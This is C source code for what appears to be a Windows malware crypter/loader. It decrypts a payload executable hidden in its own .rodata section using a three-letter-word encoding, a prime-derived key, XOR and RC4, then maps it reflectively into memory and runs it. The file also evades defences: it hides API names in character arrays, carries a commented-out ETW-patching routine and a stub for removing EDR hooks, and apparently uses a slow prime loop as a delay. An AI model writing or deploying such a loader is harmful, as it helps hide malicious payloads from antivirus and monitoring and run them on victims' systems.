#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>

#ifdef DEBUG
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) (void)0
#endif

#define KEY_LENGTH 16 // 128 bits
#define PRIME_LENGTH 8 // 64 bits
#define PRIME_TOP 60124
#define INFLATION_FACTOR 3 // is equal to word length for word encoding

// Declarations
void* load_pe (unsigned char* pe_data);
void obfuscate_import_table(void);
void patch_etw(void);
void remove_edr_hooks(void);
int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key);

typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
typedef LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE (WINAPI* pGetCurrentProcess)(void);
pVirtualProtect fnVirtualProtect;
pLoadLibraryA fnLoadLibraryA;
pVirtualAlloc fnVirtualAlloc;
pGetCurrentProcess fnGetCurrentProcess;

// Obfuscate suspicous function names via char arrays
unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x0 };
unsigned char sVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
unsigned char sGetCurrentProcess[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'N','t','d','l','l', 0x0 };

const char* wordlist[256] = {"raw", "moo", "zed", "nun", "hin", "ado", "vim", "lip", "tic", "pet", "xis", "tux", "jut", "zap", "fry", "ewe", "ice", "ink", "ask", "lay", "pod", "yam",
                        "dig", "paw", "den", "ohm", "jay", "cog", "vex", "rot", "mop", "fad", "ode", "jow", "joy", "thy", "hex", "eel", "ape", "hum", "wop", "era", "jag", "toe",
                        "zit", "nab", "cop", "jug", "mad", "oaf", "zag", "tat", "yen", "gym", "hop", "gab", "jab", "end", "tug", "tax", "bud", "bag", "wok", "bug", "yak", "god",
                        "tad", "off", "fee", "mud", "nap", "hid", "dew", "add", "jar", "rag", "bus", "new", "hog", "vat", "jib", "jog", "gin", "red", "jam", "tee", "nut", "ale", 
                        "sue", "arc", "top", "fin", "fly", "ear", "awe", "pen", "jig", "ate", "qua", "cam", "gut", "pad", "cob", "saw", "lid", "haw", "wag", "ram", "cow", "any",
                        "bay", "elk", "owl", "aim", "rut", "dug", "yet", "cup", "fit", "oar", "pun", "ebb", "won", "coy", "urn", "fog", "kin", "qed", "sty", "tag", "gig", "wad",
                        "vet", "ore", "fed", "jot", "bop", "gay", "run", "ivy", "tan", "lob", "tab", "gun", "fix", "big", "sit", "gem", "din", "sum", "hip", "cod", "rib", "bun",
                        "eon", "zip", "bib", "van", "zoo", "dam", "ion", "woe", "nib", "hen", "ash", "yes", "dot", "rum", "ago", "mug", "icy", "sky", "ova", "ton", "ill", "nip",
                        "ham", "jet", "tap", "sax", "lot", "bee", "sob", "mob", "sir", "why", "toy", "foe", "maw", "bet", "lei", "bid", "met", "bye", "box", "vie", "elm", "rue",
                        "bed", "yep", "rye", "rub", "him", "mix", "wax", "boo", "way", "axe", "hut", "oak", "dye", "lap", "wed", "lug", "eve", "cub", "nod", "oat", "ace", "cab",
                        "awl", "kit", "hay", "ran", "fig", "car", "dim", "log", "gad", "fox", "imp", "bog", "dip", "wry", "gas", "cot", "keg", "dab", "one", "air", "pat", "yip",
                        "few", "yap", "nag", "gum", "pan", "orb", "ant", "zen", "hob", "gap", "pew", "men", "egg", "pal"};

int main(int argc, char** argv) {

    if (argc > 1) {
        printf("[info] Usage: %s\n", argv[0]);
        return 1;
    }

    obfuscate_import_table();
    patch_etw();
    remove_edr_hooks();

    FILE* loader_file = fopen(argv[0], "rb");
    if (loader_file == NULL) {
        perror("Failed to fopen loader PE file");
        return 1;
    }

    if (fseek(loader_file, -40L, SEEK_END) != 0) {
        perror("Failed to seek to end of file");
        return 1;
    }

    char size_buffer[40]; // 8 byte encrypted_size + 32 byte ascii key string
    size_t read_size = fread(size_buffer, 1, sizeof(size_buffer), loader_file);
    if (read_size != sizeof(size_buffer)) {
        perror("Failed to read file");
        return 1;
    }
    fseek(loader_file, 0L, SEEK_SET);

    size_t encrypted_size = (size_t)*(int64_t*)(size_buffer);
    char *key_hexstring = (size_buffer + 8);
    DEBUG_PRINT("[info] Encrypted size: %i\n", encrypted_size);
    DEBUG_PRINT("[info] Obfuscated Decode key: %.32s\n", key_hexstring);

    unsigned char* loader_handle = (unsigned char*)GetModuleHandleA(NULL);

    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) loader_handle;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);

    unsigned char* payload_pe = NULL;
    char payload_pe_section_name[] = ".rodata";

    for(int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
        if (!strcmp((char *)sections[i].Name, payload_pe_section_name)) {
            DEBUG_PRINT("[info] Found .rodata section\n");
            payload_pe = loader_handle + sections[i].VirtualAddress;
            DEBUG_PRINT("[info] Payload PE at VA: 0x%.8x\n", *payload_pe);
            break;
        }
    }

    if(payload_pe == NULL) {
        DEBUG_PRINT("[error] Couldn't find payload PE\n");
        return 1;   
    }

    unsigned char* pe_buf = malloc(encrypted_size);
    memcpy(pe_buf, payload_pe, encrypted_size);

    const char *pos = key_hexstring;
    unsigned char key[KEY_LENGTH];

    for (size_t count = 0; count < sizeof key/sizeof *key; count++) {
        sscanf(pos, "%2hhx", &key[count]);
        pos += 2;
    }

    DEBUG_PRINT("[info] Decrypt PE\n");
    memcpy(pe_buf, payload_pe, encrypted_size);
    size_t original_size = encrypted_size/INFLATION_FACTOR;
    unsigned char *decoded_buf = malloc(original_size);
    memset(decoded_buf, 0, original_size);
    decrypt_pe(pe_buf, decoded_buf, encrypted_size, original_size, key);

    DEBUG_PRINT("[info] Load PE\n");
    void* start_address = load_pe(decoded_buf);

    DEBUG_PRINT("[info] Calling PE\n");
    if(start_address) {
        ((void (*)(void)) start_address)();
    }

    free(pe_buf);
    free(decoded_buf);

    return 0;
}

void* load_pe(unsigned char* pe_data) {
    // DEFINITIONS OF HEADERS AND CO.
    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) pe_data;
    IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1); 

    DWORD hdr_image_base = p_NT_HDR->OptionalHeader.ImageBase;
    DWORD size_of_image = p_NT_HDR->OptionalHeader.SizeOfImage;
    DWORD entry_point_RVA = p_NT_HDR->OptionalHeader.AddressOfEntryPoint;
    DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
    WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;

     DEBUG_PRINT("[info] hdr_image_base:%lu\n\
            size_of_image:%lu\n\
            entry_point_RVA:%lu\n\
            size_of_headers:%lu\n\
            num_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);

    char* image_base = (char*)fnVirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(image_base == NULL) return NULL; // allocation didn't work

    // COPY HEADERS TO MEMORY
    memcpy(image_base, pe_data, size_of_headers);
    // Copy PE section wise into memory
    for (int i = 0; i < num_of_sections; ++i) {
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD raw_data_size = sections[i].SizeOfRawData;

        if (raw_data_size > 0) {
            memcpy(dest_addr, pe_data + sections[i].PointerToRawData, raw_data_size);
        } else {
            memset(dest_addr, 0, sections[i].Misc.VirtualSize);
        }
    }

    DEBUG_PRINT("[info] Handle Import Table\n");
    
    // IMPORT TABLE
    IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;
    IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {
        
        char* module_name = image_base + import_descriptors[i].Name;
        HMODULE import_module = fnLoadLibraryA(module_name);

        DEBUG_PRINT("[info] Module Name: %s\n", module_name);
        if (import_module == NULL) {
            DEBUG_PRINT("[error] Import Module could not be found %s, continue...\n", module_name);
            continue;
        }

        IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].OriginalFirstThunk);

        IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA*)(image_base + import_descriptors[i].FirstThunk);

        for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
            void *function_handle = NULL;
            DWORD lookup_addr = lookup_table[i].u1.AddressOfData;

            if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1
                IMAGE_IMPORT_BY_NAME* image_import = (IMAGE_IMPORT_BY_NAME *)(image_base + lookup_addr);
                char *funct_name = (char *)&(image_import->Name);
                function_handle = (void *)GetProcAddress(import_module, funct_name);
            } else {
                // import by ordinal, directly
                DWORD ordinal_num = lookup_addr & (~IMAGE_ORDINAL_FLAG);
                DEBUG_PRINT("[info] Import by ordinal %lu directly\n", ordinal_num);
                function_handle = (void *)GetProcAddress(import_module, MAKEINTRESOURCEA(lookup_addr));
            }

            if (function_handle == NULL) {
                DEBUG_PRINT("[error] Function could not be found in module %s\n", module_name);
                continue;
            }

            address_table[i].u1.Function = (DWORD)function_handle;
        }
    }

    DEBUG_PRINT("[info] Handle Relocations\n");

    // RELOCATIONS
    DWORD delta_VA_reloc = ((DWORD)image_base) - p_NT_HDR->OptionalHeader.ImageBase;

    if (data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 && delta_VA_reloc != 0) {

        IMAGE_BASE_RELOCATION* p_reloc = (IMAGE_BASE_RELOCATION*) (image_base + data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while (p_reloc->VirtualAddress != 0) {

            DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
            WORD* reloc = (WORD*) (p_reloc + 1);
            for (long unsigned int i = 0; i < size; ++i) {
                int type = reloc[i] >> 12;
                int offset = reloc[i] & 0x0fff;
                DWORD* change_addr = (DWORD*) (image_base + p_reloc->VirtualAddress + offset);

                switch(type) {
                    case IMAGE_REL_BASED_HIGHLOW :
                        *change_addr += delta_VA_reloc;
                        break;
                    default:
                        break;
                }
            }

            p_reloc = (IMAGE_BASE_RELOCATION*) (((DWORD) p_reloc) + p_reloc->SizeOfBlock);
        }
    }

    // PERMISSIONS
    DWORD old_protect;
    fnVirtualProtect(image_base, size_of_headers, PAGE_READONLY, &old_protect);

    for (int i = 0; i < num_of_sections; ++i) {
        char* dest_addr = image_base + sections[i].VirtualAddress;
        DWORD section_flags = sections[i].Characteristics;
        DWORD virtual_flags = 0;
        if(section_flags & IMAGE_SCN_MEM_EXECUTE) {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else {
            virtual_flags = (section_flags & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        }
        fnVirtualProtect(dest_addr, sections[i].Misc.VirtualSize, virtual_flags, &old_protect);
    }

    return (void*) (image_base + entry_point_RVA);
}


// ============= LOADER OBFUSCATION HERE =============

void obfuscate_import_table(void) {
    fnVirtualProtect = (pVirtualProtect) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualProtect);
    fnLoadLibraryA = (pLoadLibraryA) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sLoadLibraryA);
    fnVirtualAlloc = (pVirtualAlloc) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sVirtualAlloc);
    fnGetCurrentProcess = (pGetCurrentProcess) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR)sGetCurrentProcess);
}

void patch_etw(void) {
	// unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret
	
	// ULONG oldprotect = 0;
	// size_t size = sizeof(patch);
	
	// HANDLE hCurrentProc = fnGetCurrentProcess();
	// void *pEventWrite = GetProcAddress(GetModuleHandle((LPCSTR) sNtdll), (LPCSTR) sEtwEventWrite);
    // fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);

	// memcpy(pEventWrite, patch, size / sizeof(patch[0]));
	
    // fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
	// FlushInstructionCache(hCurrentProc, pEventWrite, size);
    return;
}

 void remove_edr_hooks(void) {
    // TODO
    return;
}


// =============== DEOBFUSCATION HERE ================

unsigned char decode_word(char* word) {
    for (int i = 0; i < 256; i++) {
        if (!strcmp(wordlist[i], word)) {
            return (unsigned char)i;
        }
    }
    DEBUG_PRINT("[error] Decoding failed for: %s\n", word);

    return '\0';
}

uint64_t calc_prime_number(uint64_t n) {
    uint64_t last_prime = 0;
    for (uint64_t number = 0; number <= n; number++) {
        int prime = 1;
        for(uint64_t divisor = 2; divisor < number; divisor++) {
            if ((number % divisor) == 0) prime = 0;
        }
        if (prime) last_prime = number;
    }

    return last_prime;
}

void rc4_swap(unsigned char *a, unsigned char *b) {
    unsigned char temp = *a;
    *a = *b;
    *b = temp;
}

void rc4_init(unsigned char *s, unsigned char *key) {
    int i, j = 0;
    for (i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % KEY_LENGTH]) % 256;
        rc4_swap(&s[i], &s[j]);
    }
}

void rc4_crypt(unsigned char *s, unsigned char *data, unsigned int data_len) {
    unsigned int i = 0, j = 0, k;
    for (k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        rc4_swap(&s[i], &s[j]);
        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {

    DEBUG_PRINT("[info] Start prime calculation\n");
    uint64_t last_prime = calc_prime_number(PRIME_TOP);
    uint8_t* prime_ptr = (uint8_t *)(&last_prime);
    DEBUG_PRINT("[info] Last prime number: %llu\n", last_prime);
   
    // word decode
    unsigned char *decode_pos = decode_buf;
    for (size_t i = 0; i < encrypted_size; i += INFLATION_FACTOR) {
        char word[4] = {(char)pe_buf[i], (char)pe_buf[i+1], (char)pe_buf[i+2], '\0'};
        *decode_pos = decode_word(word);
        decode_pos++;
    }

    // XOR decode key with prime number
    for (size_t i = 0; i < KEY_LENGTH; i++) {
        key[i] ^= prime_ptr[i % PRIME_LENGTH];
    }

    char hex_string[KEY_LENGTH * 2 + 1];
    for (int i = 0; i < KEY_LENGTH; i++) {
        sprintf(&hex_string[i * 2], "%02x", key[i]);
    }
    DEBUG_PRINT("[info] Deobfuscated Key: %s\n", hex_string);

    // XOR decode
    for (size_t i = 0; i < original_size; i++) {
        decode_buf[i] ^= key[i % KEY_LENGTH];
    }

    unsigned char s[256];
    rc4_init(s, key);
    rc4_crypt(s, decode_buf, original_size);

    DEBUG_PRINT("[info] Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
    
    return 0;
}